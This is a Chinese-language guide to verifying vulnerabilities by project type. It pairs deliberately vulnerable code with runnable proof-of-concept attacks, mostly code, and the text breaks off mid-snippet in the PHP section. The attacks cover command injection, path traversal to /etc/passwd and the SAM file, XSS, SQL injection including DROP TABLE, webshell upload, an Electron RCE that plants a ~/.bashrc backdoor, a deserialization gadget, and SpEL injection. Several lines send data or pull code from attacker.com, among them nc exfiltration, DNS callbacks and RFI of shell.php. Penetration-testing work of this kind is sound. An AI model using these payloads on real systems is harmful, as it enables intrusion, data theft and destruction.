# 基于项目类型的 PoC 验证策略

## 核心理念

**不要使用通用的 PoC 验证方法** - 不同类型的项目需要不同的攻击路径和验证策略

**关键原则**：
1. 先识别项目类型，再设计验证策略
2. 不同的入口点需要不同的触发方式
3. 不同的运行环境需要不同的测试方法
4. 不同的攻击面需要不同的利用路径

---

## 项目类型识别

### 自动化识别规则

```javascript
// project_type_detector.js

function detectProjectType(projectRoot) {
  const types = [];

  // VSCode 插件检测
  if (hasVSCodeExtensionConfig(projectRoot)) {
    types.push('vscode-extension');
  }

  // Node.js CLI 检测
  if (hasCLIConfig(projectRoot)) {
    types.push('nodejs-cli');
  }

  // Electron 应用检测
  if (hasElectronConfig(projectRoot)) {
    types.push('electron-app');
  }

  // Web 应用检测
  if (hasWebFramework(projectRoot)) {
    types.push('web-app');
  }

  // Java 应用检测
  if (hasJavaConfig(projectRoot)) {
    types.push('java-app');
  }

  // PHP 应用检测
  if (hasPHPConfig(projectRoot)) {
    types.push('php-app');
  }

  // Python 应用检测
  if (hasPythonConfig(projectRoot)) {
    types.push('python-app');
  }

  // Rust 应用检测
  if (hasRustConfig(projectRoot)) {
    types.push('rust-app');
  }

  // Ruby 应用检测
  if (hasRubyConfig(projectRoot)) {
    types.push('ruby-app');
  }

  // Go 应用检测
  if (hasGoConfig(projectRoot)) {
    types.push('go-app');
  }

  // C/C++ 应用检测
  if (hasCppConfig(projectRoot)) {
    types.push('cpp-app');
  }

  // Swift 应用检测
  if (hasSwiftConfig(projectRoot)) {
    types.push('swift-app');
  }

  // 微服务检测
  if (hasMicroserviceConfig(projectRoot)) {
    types.push('microservice');
  }

  return types;
}

// Node.js 检测
function hasVSCodeExtensionConfig(root) {
  const pkg = readJson(`${root}/package.json`);
  return pkg &&
         pkg.contributes &&
         (pkg.contributes.commands || pkg.contributes.views) &&
         pkg.engines &&
         pkg.engines.vscode;
}

function hasCLIConfig(root) {
  const pkg = readJson(`${root}/package.json`);
  return pkg && (pkg.bin || pkg.cli);
}

function hasElectronConfig(root) {
  const pkg = readJson(`${root}/package.json`);
  const deps = { ...pkg.dependencies, ...pkg.devDependencies };
  return pkg && deps.electron &&
         exists(`${root}/main.js`) || exists(`${root}/main.ts`);
}

function hasWebFramework(root) {
  const pkg = readJson(`${root}/package.json`);
  const deps = { ...pkg.dependencies, ...pkg.devDependencies };
  return pkg && (
    deps.express || deps.koa || deps.fastify ||
    deps['react-scripts'] || deps['@angular/cli'] ||
    deps['vue-cli-service']
  );
}

// Java 检测
function hasJavaConfig(root) {
  return exists(`${root}/pom.xml`) ||
         exists(`${root}/build.gradle`) ||
         exists(`${root}/build.gradle.kts`);
}

// PHP 检测
function hasPHPConfig(root) {
  return exists(`${root}/composer.json`) ||
         exists(`${root}/composer.lock`);
}

// Python 检测
function hasPythonConfig(root) {
  return exists(`${root}/requirements.txt`) ||
         exists(`${root}/setup.py`) ||
         exists(`${root}/pyproject.toml`);
}

// Rust 检测
function hasRustConfig(root) {
  return exists(`${root}/Cargo.toml`) ||
         exists(`${root}/Cargo.lock`);
}

// Ruby 检测
function hasRubyConfig(root) {
  return exists(`${root}/Gemfile`) ||
         exists(`${root}/Gemfile.lock`);
}

// Go 检测
function hasGoConfig(root) {
  return exists(`${root}/go.mod`) ||
         exists(`${root}/go.sum`);
}

// C/C++ 检测
function hasCppConfig(root) {
  return exists(`${root}/Makefile`) ||
         exists(`${root}/CMakeLists.txt`) ||
         exists(`${root}/Makefile.am`);
}

// Swift 检测
function hasSwiftConfig(root) {
  return exists(`${root}/Package.swift`) ||
         exists(`${root}/Podfile`);
}

function hasMicroserviceConfig(root) {
  const hasDocker = exists(`${root}/docker-compose.yml`) ||
                     exists(`${root}/Dockerfile`);
  const hasMultipleModules = hasMultiplePackages(root) ||
                              hasMultiplePoms(root);
  return hasDocker && hasMultipleModules;
}
```

---

## VSCode 插件 PoC 验证

### 特点分析

**运行环境**：VSCode 扩展宿主环境
**入口点**：命令触发、视图交互、事件监听
**特权级别**：受限，但可通过 workspace.fs 操作文件系统
**攻击面**：
1. 命令执行（通过终端）
2. 文件操作（通过 workspace API）
3. 代码注入（通过 WebView）
4. 信息泄露（通过扩展状态）

### 常见漏洞类型

#### 1. 命令注入

**漏洞场景**：
```typescript
// vulnerable.ts
const { exec } = require('child_process');

vscode.commands.registerCommand('extension.runScript', (scriptPath) => {
  exec(`node ${scriptPath}`, (error, stdout, stderr) => {
    vscode.window.showInformationMessage(stdout);
  });
});
```

**PoC 验证**：
```typescript
// poc/command_injection.ts
import * as vscode from 'vscode';

export async function testCommandInjection() {
  // PoC 1: 简单命令注入
  const maliciousScript = 'main.js; whoami; #';
  await vscode.commands.executeCommand('extension.runScript', maliciousScript);

  // PoC 2: 反引号注入
  const maliciousScript2 = 'main.js`whoami`';
  await vscode.commands.executeCommand('extension.runScript', maliciousScript2);

  // PoC 3: 管道注入
  const maliciousScript3 = 'main.js | cat /etc/passwd';
  await vscode.commands.executeCommand('extension.runScript', maliciousScript3);
}
```

**验证方法**：
1. 打开测试项目
2. 加载恶意 PoC
3. 执行命令
4. 检查是否成功执行恶意命令
5. 验证结果：查看终端输出或文件系统变化

#### 2. 路径遍历

**漏洞场景**：
```typescript
// vulnerable.ts
vscode.commands.registerCommand('extension.readFile', (filePath) => {
  const uri = vscode.Uri.file(filePath);
  vscode.workspace.fs.readFile(uri).then(content => {
    vscode.window.showInformationMessage(content.toString());
  });
});
```

**PoC 验证**：
```typescript
// poc/path_traversal.ts
import * as vscode from 'vscode';

export async function testPathTraversal() {
  // PoC 1: 向上遍历
  const maliciousPath1 = '../../../etc/passwd';
  await vscode.commands.executeCommand('extension.readFile', maliciousPath1);

  // PoC 2: 绝对路径
  const maliciousPath2 = '/etc/passwd';
  await vscode.commands.executeCommand('extension.readFile', maliciousPath2);

  // PoC 3: Windows 路径遍历
  const maliciousPath3 = '..\\..\\..\\windows\\system32\\config\\sam';
  await vscode.commands.executeCommand('extension.readFile', maliciousPath3);

  // PoC 4: URL 编码绕过
  const maliciousPath4 = '..%2F..%2F..%2Fetc%2Fpasswd';
  await vscode.commands.executeCommand('extension.readFile', maliciousPath4);
}
```

**验证方法**：
1. 创建虚拟工作区
2. 执行路径遍历 PoC
3. 检查是否读取到敏感文件
4. 验证结果：查看弹出的信息内容

#### 3. WebView XSS

**漏洞场景**：
```typescript
// vulnerable.ts
const panel = vscode.window.createWebviewPanel(
  'testPanel',
  'Test',
  vscode.ViewColumn.One,
  { enableScripts: true }
);

panel.webview.onDidReceiveMessage(message => {
  // 直接渲染用户输入
  panel.webview.html = `<h1>${message.text}</h1>`;
});
```

**PoC 验证**：
```typescript
// poc/webview_xss.ts
import * as vscode from 'vscode';

export async function testWebViewXSS() {
  // PoC 1: 简单 script 注入
  const maliciousInput1 = '<script>alert("XSS")</script>';
  panel.webview.postMessage({ text: maliciousInput1 });

  // PoC 2: 事件处理器注入
  const maliciousInput2 = '<img src=x onerror=alert("XSS")>';
  panel.webview.postMessage({ text: maliciousInput2 });

  // PoC 3: SVG 注入
  const maliciousInput3 = '<svg onload=alert("XSS")>';
  panel.webview.postMessage({ text: maliciousInput3 });

  // PoC 4: 混淆 Payload
  const maliciousInput4 = '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>';
  panel.webview.postMessage({ text: maliciousInput4 });
}
```

**验证方法**：
1. 打开 WebView 面板
2. 发送恶意消息
3. 检查是否执行 JavaScript
4. 验证结果：查看是否有 alert 弹出或控制台输出

### 验证流程

```
1. 环境准备
   - 安装 VSCode
   - 安装测试扩展
   - 创建测试工作区

2. PoC 编写
   - 分析入口点
   - 构造恶意输入
   - 编写触发脚本

3. 执行验证
   - 加载扩展
   - 执行 PoC
   - 监控行为

4. 结果分析
   - 检查文件系统变化
   - 检查进程列表
   - 检查网络请求
   - 记录漏洞证据
```

---

## Web 应用 PoC 验证

### 特点分析

**运行环境**：Web 服务器
**入口点**：HTTP 请求（GET/POST）
**特权级别**：服务器权限
**攻击面**：
1. SQL 注入
2. XSS
3. 文件上传
4. 反序列化
5. CSRF

### 常见漏洞类型

#### 1. SQL 注入

**漏洞场景**：
```javascript
// vulnerable.js
app.get('/user/:id', (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
  db.query(query, (err, result) => {
    res.json(result);
  });
});
```

**PoC 验证**：
```javascript
// poc/sql_injection.js
import fetch from 'node-fetch';

export async function testSQLInjection() {
  const baseUrl = 'http://localhost:3000';

  // PoC 1: UNION 查询
  const payload1 = '1 UNION SELECT username, password FROM users';
  const response1 = await fetch(`${baseUrl}/user/${payload1}`);
  console.log(await response1.json());

  // PoC 2: 基于错误的注入
  const payload2 = "1' AND 1=1--";
  const response2 = await fetch(`${baseUrl}/user/${payload2}`);
  console.log(await response2.json());

  // PoC 3: 盲注（基于时间）
  const payload3 = "1' AND SLEEP(5)--";
  const startTime = Date.now();
  await fetch(`${baseUrl}/user/${payload3}`);
  const endTime = Date.now();
  if (endTime - startTime > 5000) {
    console.log('Blind SQL Injection confirmed');
  }

  // PoC 4: 堆叠查询
  const payload4 = "1; DROP TABLE users--";
  const response4 = await fetch(`${baseUrl}/user/${payload4}`);
  console.log(await response4.json());
}
```

**验证方法**：
1. 启动测试服务器
2. 发送恶意请求
3. 检查响应
4. 验证结果：查看是否有数据泄露或错误信息

#### 2. XSS

**漏洞场景**：
```javascript
// vulnerable.js
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<div>搜索结果: ${query}</div>`);
});
```

**PoC 验证**：
```javascript
// poc/xss.js
import fetch from 'node-fetch';
import puppeteer from 'puppeteer';

export async function testXSS() {
  const baseUrl = 'http://localhost:3000';
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // PoC 1: 反射型 XSS
  const payload1 = '<script>alert("XSS")</script>';
  page.on('dialog', async dialog => {
    console.log('XSS confirmed:', dialog.message());
    await dialog.accept();
  });
  await page.goto(`${baseUrl}/search?q=${encodeURIComponent(payload1)}`);

  // PoC 2: 存储 XSS
  const payload2 = '<img src=x onerror=alert("Stored XSS")>';
  await page.evaluate(() => {
    fetch('/api/comment', {
      method: 'POST',
      body: JSON.stringify({ comment: arguments[0] })
    });
  }, payload2);

  // PoC 3: DOM XSS
  await page.goto(`${baseUrl}/search?q=#<img src=x onerror=alert("DOM XSS")>`);
  await page.waitFor(1000);

  await browser.close();
}
```

**验证方法**：
1. 启动浏览器
2. 访问恶意 URL
3. 监控 JavaScript 执行
4. 验证结果：查看是否有 alert 弹出

#### 3. 文件上传

**漏洞场景**：
```javascript
// vulnerable.js
app.post('/upload', (req, res) => {
  const file = req.files.file;
  const path = `./uploads/${file.name}`;
  file.mv(path, (err) => {
    res.send('File uploaded');
  });
});
```

**PoC 验证**：
```javascript
// poc/file_upload.js
import FormData from 'form-data';
import fetch from 'node-fetch';
import fs from 'fs';

export async function testFileUpload() {
  const baseUrl = 'http://localhost:3000';

  // PoC 1: Webshell 上传
  const form1 = new FormData();
  form1.append('file', fs.createReadStream('webshell.php'), {
    filename: 'shell.php',
    contentType: 'application/x-php'
  });
  await fetch(`${baseUrl}/upload`, { method: 'POST', body: form1 });

  // PoC 2: 双重扩展名绕过
  const form2 = new FormData();
  form2.append('file', fs.createReadStream('webshell.php'), {
    filename: 'shell.php.jpg',
    contentType: 'image/jpeg'
  });
  await fetch(`${baseUrl}/upload`, { method: 'POST', body: form2 });

  // PoC 3: .htaccess 覆盖
  const htaccess = 'AddType application/x-httpd-php .jpg';
  const form3 = new FormData();
  form3.append('file', Buffer.from(htaccess), {
    filename: '.htaccess',
    contentType: 'text/plain'
  });
  await fetch(`${baseUrl}/upload`, { method: 'POST', body: form3 });

  // 验证：尝试访问上传的文件
  const response = await fetch(`${baseUrl}/uploads/shell.php`);
  console.log('Webshell accessible:', response.ok);
}
```

**验证方法**：
1. 构造恶意文件
2. 上传文件
3. 尝试访问上传的文件
4. 验证结果：检查文件是否可执行

### 验证流程

```
1. 环境准备
   - 启动测试服务器
   - 配置测试数据库
   - 准备测试数据

2. PoC 编写
   - 分析 HTTP 接口
   - 构造恶意请求
   - 编写自动化脚本

3. 执行验证
   - 发送请求
   - 监控响应
   - 检查数据库

4. 结果分析
   - 检查 HTTP 响应
   - 检查数据库变化
   - 检查服务器日志
   - 记录漏洞证据
```

---

## Node.js CLI PoC 验证

### 特点分析

**运行环境**：命令行
**入口点**：命令行参数
**特权级别**：当前用户权限
**攻击面**：
1. 命令注入
2. 路径遍历
3. 环境变量污染
4. 依赖注入

### 常见漏洞类型

#### 1. 命令注入

**漏洞场景**：
```javascript
// vulnerable.js
const { exec } = require('child_process');

program
  .command('run <script>')
  .action((script) => {
    exec(`node ${script}`, (err, stdout) => {
      console.log(stdout);
    });
  });
```

**PoC 验证**：
```bash
# poc/command_injection.sh

# PoC 1: 分号注入
./cli.js run "main.js; whoami; #"

# PoC 2: 反引号注入
./cli.js run "main.js\`whoami\`"

# PoC 3: 管道注入
./cli.js run "main.js | cat /etc/passwd"

# PoC 4: 命令替换
./cli.js run "main.js $(whoami)"
```

**验证方法**：
1. 执行 CLI 命令
2. 传入恶意参数
3. 检查命令输出
4. 验证结果：查看是否执行了恶意命令

#### 2. 路径遍历

**漏洞场景**：
```javascript
// vulnerable.js
program
  .command('read <file>')
  .action((file) => {
    const content = fs.readFileSync(file, 'utf8');
    console.log(content);
  });
```

**PoC 验证**：
```bash
# poc/path_traversal.sh

# PoC 1: 向上遍历
./cli.js read "../../../etc/passwd"

# PoC 2: 绝对路径
./cli.js read "/etc/passwd"

# PoC 3: Windows 路径遍历
./cli.js read "..\\..\\..\\windows\\system32\\config\\sam"

# PoC 4: URL 编码绕过
./cli.js read "..%2F..%2F..%2Fetc%2Fpasswd"
```

**验证方法**：
1. 执行 CLI 命令
2. 传入恶意路径
3. 检查命令输出
4. 验证结果：查看是否读取到敏感文件

### 验证流程

```
1. 环境准备
   - 安装 CLI 工具
   - 准备测试文件
   - 配置测试环境

2. PoC 编写
   - 分析命令参数
   - 构造恶意输入
   - 编写 shell 脚本

3. 执行验证
   - 执行命令
   - 传入参数
   - 监控输出

4. 结果分析
   - 检查命令输出
   - 检查文件系统变化
   - 检查进程列表
   - 记录漏洞证据
```

---

## Electron 应用 PoC 验证

### 特点分析

**运行环境**：Electron 桌面应用
**入口点**：IPC 消息、外部协议
**特权级别**：主进程有系统权限
**攻击面**：
1. IPC 注入
2. RCE（通过 nodeIntegration）
3. 协议劫持
4. WebView 漏洞

### 常见漏洞类型

#### 1. IPC 注入

**漏洞场景**：
```javascript
// vulnerable.js (main process)
ipcMain.on('execute-command', (event, command) => {
  exec(command, (error, stdout) => {
    event.reply('command-result', stdout);
  });
});
```

**PoC 验证**：
```javascript
// poc/ipc_injection.js
import { ipcRenderer } from 'electron';

export async function testIPCInjection() {
  // PoC 1: 简单命令注入
  ipcRenderer.send('execute-command', 'whoami');

  // PoC 2: 链式命令
  ipcRenderer.send('execute-command', 'whoami; ls -la');

  // PoC 3: 反引号注入
  ipcRenderer.send('execute-command', '`cat /etc/passwd`');

  // PoC 4: 管道注入
  ipcRenderer.send('execute-command', 'echo "test" | nc attacker.com 1234');

  // 监听结果
  ipcRenderer.on('command-result', (event, result) => {
    console.log('Command result:', result);
  });
}
```

**验证方法**：
1. 启动 Electron 应用
2. 加载恶意 PoC
3. 发送 IPC 消息
4. 验证结果：查看是否执行了恶意命令

#### 2. nodeIntegration RCE

**漏洞场景**：
```javascript
// vulnerable.js (main process)
mainWindow = new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,  // 危险配置
    contextIsolation: false  // 危险配置
  }
});
```

**PoC 验证**：
```javascript
// poc/rce.js
import { remote } from 'electron';

export async function testRCE() {
  // PoC 1: 执行任意命令
  const { exec } = remote.require('child_process');
  exec('whoami', (error, stdout) => {
    alert(stdout);
  });

  // PoC 2: 读取任意文件
  const fs = remote.require('fs');
  const content = fs.readFileSync('/etc/passwd', 'utf8');
  console.log(content);

  // PoC 3: 写入任意文件
  fs.writeFileSync('/tmp/pwn.txt', 'You have been pwned!');

  // PoC 4: 安装后门
  exec('echo "malicious_command" >> ~/.bashrc');
}
```

**验证方法**：
1. 启动 Electron 应用
2. 加载恶意 PoC
3. 执行代码
4. 验证结果：检查是否执行了恶意操作

### 验证流程

```
1. 环境准备
   - 构建 Electron 应用
   - 启动应用
   - 准备测试数据

2. PoC 编写
   - 分析 IPC 接口
   - 构造恶意消息
   - 编写测试脚本

3. 执行验证
   - 加载 PoC
   - 发送消息
   - 监控行为

4. 结果分析
   - 检查进程列表
   - 检查文件系统变化
   - 检查网络请求
   - 记录漏洞证据
```

---

## 微服务 PoC 验证

### 特点分析

**运行环境**：容器化环境
**入口点**：gRPC/REST API
**特权级别**：容器内权限
**攻击面**：
1. 容器逃逸
2. 服务间注入
3. 配置泄露
4. 供应链攻击

### 验证流程

```
1. 环境准备
   - 启动 Docker Compose
   - 配置服务间通信
   - 准备测试数据

2. PoC 编写
   - 分析服务间调用
   - 构造恶意请求
   - 编写测试脚本

3. 执行验证
   - 发送请求
   - 监控服务间通信
   - 检查容器状态

4. 结果分析
   - 检查 API 响应
   - 检查容器日志
   - 检查网络流量
   - 记录漏洞证据
```

---

## Java 应用 PoC 验证

### 特点分析

**运行环境**：JVM
**入口点**：HTTP 请求、JNI 调用、反射 API
**特权级别**：JVM 权限
**攻击面**：
1. SQL 注入
2. 反序列化漏洞
3. 反射注入
4. SpEL 注入
5. OGNL 注入
6. 文件上传
7. 命令执行

### 常见漏洞类型

#### 1. SQL 注入

**漏洞场景**：
```java
// vulnerable.java
import java.sql.*;

public class UserService {
    public User getUserById(String userId) throws SQLException {
        Connection conn = DriverManager.getConnection(url, user, pass);
        String query = "SELECT * FROM users WHERE id = " + userId;
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(query);
        // ...
    }
}
```

**PoC 验证**：
```java
// poc/SQLInjection.java
import java.sql.*;
import java.net.*;

public class SQLInjectionTest {
    private static final String BASE_URL = "http://localhost:8080";

    public static void main(String[] args) throws Exception {
        // PoC 1: UNION 查询
        testUnionBasedInjection();

        // PoC 2: 基于错误的注入
        testErrorBasedInjection();

        // PoC 3: 盲注（基于时间）
        testTimeBasedBlindInjection();

        // PoC 4: 堆叠查询
        testStackedQueries();
    }

    public static void testUnionBasedInjection() throws Exception {
        String payload = "1 UNION SELECT username, password FROM users";
        String url = BASE_URL + "/api/user?id=" + URLEncoder.encode(payload, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String response = reader.readLine();
        System.out.println("Union-based injection response: " + response);
    }

    public static void testErrorBasedInjection() throws Exception {
        String payload = "1' AND 1=1--";
        String url = BASE_URL + "/api/user?id=" + URLEncoder.encode(payload, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        if (conn.getResponseCode() == 200) {
            System.out.println("Error-based injection confirmed");
        }
    }

    public static void testTimeBasedBlindInjection() throws Exception {
        String payload = "1' AND SLEEP(5)--";
        String url = BASE_URL + "/api/user?id=" + URLEncoder.encode(payload, "UTF-8");

        long startTime = System.currentTimeMillis();
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");
        conn.getInputStream();
        long endTime = System.currentTimeMillis();

        if (endTime - startTime > 5000) {
            System.out.println("Time-based blind SQL injection confirmed");
        }
    }

    public static void testStackedQueries() throws Exception {
        String payload = "1; DROP TABLE users--";
        String url = BASE_URL + "/api/user?id=" + URLEncoder.encode(payload, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        if (conn.getResponseCode() == 500) {
            System.out.println("Stacked queries injection confirmed");
        }
    }
}
```

**验证方法**：
1. 启动测试服务器
2. 发送恶意 HTTP 请求
3. 检查响应内容
4. 验证结果：查看是否有数据泄露或错误信息

#### 2. 反序列化漏洞

**漏洞场景**：
```java
// vulnerable.java
import java.io.*;

public class DeserializeService {
    public Object deserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        return ois.readObject();
    }
}
```

**PoC 验证**：
```java
// poc/Deserialization.java
import java.io.*;
import java.net.*;
import java.util.*;

public class DeserializationTest {
    private static final String BASE_URL = "http://localhost:8080";

    public static void main(String[] args) throws Exception {
        // PoC 1: Apache Commons Collections gadget
        testCommonsCollectionsGadget();

        // PoC 2: JDK gadget
        testJDKGadget();

        // PoC 3: Spring Framework gadget
        testSpringGadget();
    }

    public static void testCommonsCollectionsGadget() throws Exception {
        // 构造恶意对象（使用 ysoserial 生成）
        byte[] payload = generateCCGadget();

        URL url = new URL(BASE_URL + "/api/deserialize");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.getOutputStream().write(payload);

        // 检查是否执行了恶意命令
        // 可以通过 DNS 监控或 HTTP 回调验证
    }

    public static void testJDKGadget() throws Exception {
        byte[] payload = generateJDKGadget();

        URL url = new URL(BASE_URL + "/api/deserialize");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.getOutputStream().write(payload);
    }

    public static void testSpringGadget() throws Exception {
        byte[] payload = generateSpringGadget();

        URL url = new URL(BASE_URL + "/api/deserialize");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.getOutputStream().write(payload);
    }

    // 使用 ysoserial 生成 payload
    private static byte[] generateCCGadget() {
        // 实际项目中可以使用 ysoserial 工具生成
        // java -jar ysoserial.jar CommonsCollections1 'ping attacker.com'
        return new byte[0];
    }

    private static byte[] generateJDKGadget() {
        return new byte[0];
    }

    private static byte[] generateSpringGadget() {
        return new byte[0];
    }
}
```

**验证方法**：
1. 使用 ysoserial 生成恶意 payload
2. 发送反序列化请求
3. 监控 DNS 或 HTTP 回调
4. 验证结果：查看是否执行了恶意代码

#### 3. 反射注入

**漏洞场景**：
```java
// vulnerable.java
import java.lang.reflect.*;

public class ReflectionService {
    public Object invokeMethod(String className, String methodName, Object[] args)
            throws Exception {
        Class<?> clazz = Class.forName(className);
        Method method = clazz.getMethod(methodName);
        return method.invoke(null, args);
    }
}
```

**PoC 验证**：
```java
// poc/Reflection.java
import java.lang.reflect.*;
import java.net.*;

public class ReflectionTest {
    private static final String BASE_URL = "http://localhost:8080";

    public static void main(String[] args) throws Exception {
        // PoC 1: 执行系统命令
        testSystemCommand();

        // PoC 2: 读取敏感文件
        testReadFile();

        // PoC 3: 写入文件
        testWriteFile();
    }

    public static void testSystemCommand() throws Exception {
        String className = "java.lang.Runtime";
        String methodName = "exec";
        String command = "whoami";

        String url = BASE_URL + "/api/reflect" +
                "?className=" + URLEncoder.encode(className, "UTF-8") +
                "&methodName=" + URLEncoder.encode(methodName, "UTF-8") +
                "&arg0=" + URLEncoder.encode(command, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String response = reader.readLine();
        System.out.println("Reflection injection response: " + response);
    }

    public static void testReadFile() throws Exception {
        String className = "java.nio.file.Files";
        String methodName = "readAllBytes";
        String path = "/etc/passwd";

        String url = BASE_URL + "/api/reflect" +
                "?className=" + URLEncoder.encode(className, "UTF-8") +
                "&methodName=" + URLEncoder.encode(methodName, "UTF-8") +
                "&arg0=" + URLEncoder.encode(path, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String response = reader.readLine();
        System.out.println("Read file via reflection: " + response.substring(0, 50) + "...");
    }

    public static void testWriteFile() throws Exception {
        String className = "java.nio.file.Files";
        String methodName = "write";
        String path = "/tmp/pwn.txt";
        String content = "You have been pwned!";

        String url = BASE_URL + "/api/reflect" +
                "?className=" + URLEncoder.encode(className, "UTF-8") +
                "&methodName=" + URLEncoder.encode(methodName, "UTF-8") +
                "&arg0=" + URLEncoder.encode(path, "UTF-8") +
                "&arg1=" + URLEncoder.encode(content, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        System.out.println("File write injection attempt completed");
    }
}
```

**验证方法**：
1. 构造反射注入请求
2. 检查是否执行了恶意操作
3. 验证结果：查看文件系统变化或命令执行结果

#### 4. SpEL 注入

**漏洞场景**：
```java
// vulnerable.java
import org.springframework.expression.*;
import org.springframework.expression.spel.standard.*;

public class SpelService {
    private SpelExpressionParser parser = new SpelExpressionParser();

    public Object evaluate(String expression) {
        Expression expr = parser.parseExpression(expression);
        return expr.getValue();
    }
}
```

**PoC 验证**：
```java
// poc/SpELInjection.java
import org.springframework.expression.*;
import org.springframework.expression.spel.standard.*;
import org.springframework.expression.spel.support.*;
import java.net.*;

public class SpELInjectionTest {
    private static final String BASE_URL = "http://localhost:8080";

    public static void main(String[] args) throws Exception {
        // PoC 1: 执行系统命令
        testSpELCommandExecution();

        // PoC 2: 读取环境变量
        testSpELReadEnv();

        // PoC 3: DNS 外带
        testSpELDNSOutbound();
    }

    public static void testSpELCommandExecution() throws Exception {
        String expression = "T(java.lang.Runtime).getRuntime().exec('whoami')";

        String url = BASE_URL + "/api/spel?expr=" +
                URLEncoder.encode(expression, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        System.out.println("SpEL command injection attempt completed");
    }

    public static void testSpELReadEnv() throws Exception {
        String expression = "T(java.lang.System).getenv()";

        String url = BASE_URL + "/api/spel?expr=" +
                URLEncoder.encode(expression, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String response = reader.readLine();
        System.out.println("Environment variables: " + response.substring(0, 100) + "...");
    }

    public static void testSpELDNSOutbound() throws Exception {
        String expression = "T(java.net.InetAddress).getByName('attacker.com')";

        String url = BASE_URL + "/api/spel?expr=" +
                URLEncoder.encode(expression, "UTF-8");

        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");

        // 检查 DNS 请求是否发送到 attacker.com
        System.out.println("SpEL DNS outbound attempt completed");
    }
}
```

**验证方法**：
1. 构造 SpEL 注入表达式
2. 监控 DNS 或 HTTP 回调
3. 验证结果：查看是否执行了恶意操作

### 验证流程

```
1. 环境准备
   - 构建 Java 项目（Maven/Gradle）
   - 启动 Tomcat/Jetty/Spring Boot
   - 准备测试数据库

2. PoC 编写
   - 分析 Spring/Struts/Hibernate 配置
   - 构造恶意输入
   - 编写测试代码

3. 执行验证
   - 发送 HTTP 请求
   - 监控 JVM 行为
   - 检查数据库

4. 结果分析
   - 检查 HTTP 响应
   - 检查 JVM 日志
   - 检查数据库变化
   - 记录漏洞证据
```

---

## PHP 应用 PoC 验证

### 特点分析

**运行环境**：PHP-FPM/Apache/Nginx
**入口点**：HTTP 请求、CLI 参数
**特权级别**：Web 服务器权限
**攻击面**：
1. SQL 注入
2. 文件包含
3. 命令注入
4. XSS
5. 反序列化
6. 类型混淆

### 常见漏洞类型

#### 1. SQL 注入

**漏洞场景**：
```php
// vulnerable.php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = " . $id;
$result = mysqli_query($conn, $sql);
?>
```

**PoC 验证**：
```php
// poc/sql_injection.php
<?php
function testSQLInjection($baseUrl) {
    // PoC 1: UNION 查询
    $payload1 = '1 UNION SELECT username, password FROM users';
    $url1 = $baseUrl . '/user.php?id=' . urlencode($payload1);
    $response1 = file_get_contents($url1);
    echo "Union-based injection: " . substr($response1, 0, 100) . "\n";

    // PoC 2: 基于错误的注入
    $payload2 = "1' AND 1=1--";
    $url2 = $baseUrl . '/user.php?id=' . urlencode($payload2);
    $response2 = file_get_contents($url2);
    echo "Error-based injection: " . substr($response2, 0, 100) . "\n";

    // PoC 3: 盲注（基于时间）
    $payload3 = "1' AND SLEEP(5)--";
    $url3 = $baseUrl . '/user.php?id=' . urlencode($payload3);
    $startTime = microtime(true);
    file_get_contents($url3);
    $endTime = microtime(true);
    if ($endTime - $startTime > 5) {
        echo "Time-based blind injection confirmed\n";
    }

    // PoC 4: 堆叠查询
    $payload4 = "1; DROP TABLE users--";
    $url4 = $baseUrl . '/user.php?id=' . urlencode($payload4);
    $response4 = file_get_contents($url4);
    echo "Stacked queries: " . substr($response4, 0, 100) . "\n";
}

testSQLInjection('http://localhost:8000');
?>
```

#### 2. 文件包含

**漏洞场景**：
```php
// vulnerable.php
<?php
$page = $_GET['page'];
include($page . '.php');
?>
```

**PoC 验证**：
```php
// poc/file_inclusion.php
<?php
function testFileInclusion($baseUrl) {
    // PoC 1: LFI（本地文件包含）
    $payload1 = '../../../../etc/passwd';
    $url1 = $baseUrl . '/index.php?page=' . urlencode($payload1);
    $response1 = file_get_contents($url1);
    if (strpos($response1, 'root:') !== false) {
        echo "LFI confirmed\n";
    }

    // PoC 2: RFI（远程文件包含）
    $payload2 = 'http://attacker.com/shell.php';
    $url2 = $baseUrl . '/index.php?page=' . urlencode($payload2);
    $response2 = file_get_contents($url2);
    echo "RFI attempt completed\n";

    // PoC 3: PHP 伪协议
    $payload3 = 'php://filter/convert.base64-encode/resource=index';
